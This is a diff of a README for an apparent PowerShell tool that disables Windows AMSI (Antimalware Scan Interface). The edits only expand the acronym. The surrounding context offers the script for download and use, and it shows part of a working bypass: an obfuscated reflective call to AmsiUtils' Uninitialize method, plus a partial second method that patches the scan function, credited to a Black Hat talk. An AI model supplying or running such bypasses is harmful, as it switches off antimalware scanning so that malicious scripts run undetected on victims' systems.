@@ -8,7 +8,7 @@ This script can run on any of [these](./static/VERSIONS.md) versions of Windows.
 ### Usage
 ---
 
-Simply download the [script](./script/bypass-amsi.dll.ps1) and run it in powershell. It will automatically bypass AMSI and allow you to run any powershell script without being blocked by AMSI.
+Simply download the [script](./script/bypass-amsi.dll.ps1) and run it in powershell. It will automatically bypass AMSI (Antimalware Scan Interface) and allow you to run any powershell script without being blocked by AMSI (Antimalware Scan Interface).
 
 
 
@@ -30,7 +30,7 @@ $object = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
 $Uninitialize = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
 $Uninitialize.Invoke($object,$null)
 ```
-AMSI Bypass created By Maor Korkos https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf | Page 43
+AMSI (Antimalware Scan Interface) Bypass created By Maor Korkos https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf | Page 43
 
 
 ### 2nd Method by Maor Korkos
@@ -54,4 +54,4 @@ $AmsiProviderScanFunc = [System.Runtime.InteropServices.Marshal]::ReadInt32($Ant
 }
 ```
 
-AMSI Bypass created By Maor Korkos https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf | Page 51
+AMSI (Antimalware Scan Interface) Bypass created By Maor Korkos https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf | Page 51
